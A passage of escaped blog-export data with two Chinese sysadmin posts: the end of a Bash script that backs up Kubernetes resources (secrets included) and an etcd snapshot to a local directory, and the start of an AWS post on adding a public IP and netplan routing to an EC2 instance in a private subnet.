设置输出目录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eOUTPUT_DIR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/root/k8s_deployments_backup/\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate +%Y%m%d\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 要备份的资源类型及其对应的 kubectl 别名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 注意：Secret 资源会备份所有类型，包括自动生成的 Service Account Tokens。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRESOURCE_TYPES\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;deployments\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;secrets\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ingresses\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;services\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 确保脚本在遇到错误时立即退出\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- 正在创建输出目录: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ----------------------------------------------------\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 核心函数：备份指定类型的资源\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 参数: $1 = 资源类型 (如 deployment), $2 = 命名空间, $3 = 输出目录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ----------------------------------------------------\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebackup_resource\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eNAMESPACE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eDIR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# 获取当前命名空间中所有该类型资源的名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# 使用 2\u0026gt;/dev/null 隐藏找不到资源时的错误信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eRESOURCES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ekubectl get \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -o \u003cspan class=\"nv\"\u003ejsonpath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{.items[*].metadata.name}\u0026#39;\u003c/span\u003e 2\u0026gt;/dev/null\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -z \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$RESOURCES\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;  [信息] 命名空间 \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e 中未找到 \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;  -\u0026gt; 找到 \u003c/span\u003e\u003cspan class=\"si\"\u003e${#\u003c/span\u003e\u003cspan class=\"nv\"\u003eRESOURCES\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e 个 \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e，正在导出...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# 遍历每个资源并保存 YAML\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e RESOURCE in \u003cspan class=\"nv\"\u003e$RESOURCES\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# 文件名格式: namespace-resource_type-resourcename.yaml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eFILE_NAME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNAMESPACE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e-\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e-\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eRESOURCE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e.yaml\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e \u003cspan class=\"nv\"\u003eFILE_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"nv\"\u003e$FILE_NAME\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# 使用 kubectl get 获取 YAML，并通过管道和 sed 清理元数据字段\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        kubectl get \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$RESOURCE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -o yaml --ignore-not-found \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"c1\"\u003e# 清理元数据字段，使 YAML 更干净，便于重新应用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  creationTimestamp:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  resourceVersion:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  uid:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  selfLink:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          sed \u003cspan class=\"s1\"\u003e\u0026#39;/^  status:/d\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e          \u0026gt; \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$FILE_PATH\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# 检查 Secret 是否为 Service Account Token，如果是，则发出警告\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;secrets\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e grep -q \u003cspan class=\"s1\"\u003e\u0026#39;kubernetes.io/service-account.name\u0026#39;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$FILE_PATH\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;    [警告] Secret \u003c/span\u003e\u003cspan class=\"nv\"\u003e$RESOURCE\u003c/span\u003e\u003cspan class=\"s2\"\u003e 是 Service Account Token，通常不需要备份。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 1. 获取所有命名空间 (Namespace)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNAMESPACES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ekubectl get ns -o \u003cspan class=\"nv\"\u003ejsonpath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{.items[*].metadata.name}\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -z \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACES\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;错误：未找到任何命名空间。请检查 kubectl 配置和集群连接。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;找到以下命名空间: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACES\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;----------------------------------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 2. 遍历每个命名空间和资源类型\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e NAMESPACE in \u003cspan class=\"nv\"\u003e$NAMESPACES\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- 处理命名空间: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e TYPE in \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eRESOURCE_TYPES\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        backup_resource \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TYPE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- 命名空间 \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NAMESPACE\u003c/span\u003e\u003cspan class=\"s2\"\u003e 处理完成 ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eETCDCTL_API\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e etcdctl \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--endpoints\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttps://10.10.240.3:2379 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cacert\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/ssl/etcd/ca.pem \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cert\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/ssl/etcd/etcd-client.pem \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--key\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/ssl/etcd/etcd-client-key.pem \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003esnapshot save \u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e/etcd-\u003cspan class=\"sb\"\u003e`\u003c/span\u003edate +%Y%m%d\u003cspan class=\"sb\"\u003e`\u003c/span\u003e-snapshot.db\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;====================================================\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;✅ 所有指定资源已成功备份到目录: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$OUTPUT_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;====================================================\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Kubernetes下各种资源的每日定期备份"},{"content":"今天面试了一下，面试官问到AWS的子网问题，来说说AWS的最佳实践：\n首先是VPC的划定，然后就是三个public子网，三个private子网，都是一个zone分布在a、b、c三个不同机房\n来保证最大冗余性，然后pub子网通过IGW来出公网，那Private子网就通过NAT出公网。\n但是，但是，但是：\n如果你把一台EC2服务器一开始就放错了子网，放到了private子网里，然后上面又跑了重要的服务，无法迁移，无法重启，而且整个vpc里只有这一台ec2，其它东西都是aws的服务或者市场的服务又或者fargate、lambda之类的无服务器，这时候你想进去调试，那就麻烦大了\n那能不能给这台private的机器加上公网ip来当作跳板机直接访问呢？\n答案是肯定的，可以。\n但是又来了，如果这么配置了，你要对路由非常的熟悉，因为随后发生错乱的情况可能需要你手动添加路由，最麻烦的不是配置网卡，而是配置路由！\n做法如下：\n一、动态添加弹性ip到这个ec2的第二个网卡\n二、配置网络\n# vi /etc/netplan/50-cloud-init.yaml # This file is generated from information provided by the datasource. Changes # to it will not persist across an instance reboot. To disable cloud-init\u0026#39;s # network configuration capabilities, write a file # /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following: # network: {config: disabled} network: ethernets: enX0: addresses: - 10.0.132.169/20 #The private IP address of primary ENI nameservers: addresses: - 10.0.0.2 routes: - to: 0.0.0.0/0 via: 10.0.128.1 # Default gateway, you can find it using** ip r** command table: 1001 - to: 10.0.132.169 via: 0.0.0.0 scope: link table: 1001 routing-policy: - from: 10.0.132.169 table: 1001 dhcp4: no dhcp6: false match: macaddress: 06:36:82:ef:39:39 set-name: enX0 enX1: addresses: - 10.0.3.176/20 #The private IP address of primary ENI gateway4: 10.0.0.1 nameservers: addresses: - 8.8.8.8 - 1.1.1.1 routes: - to: 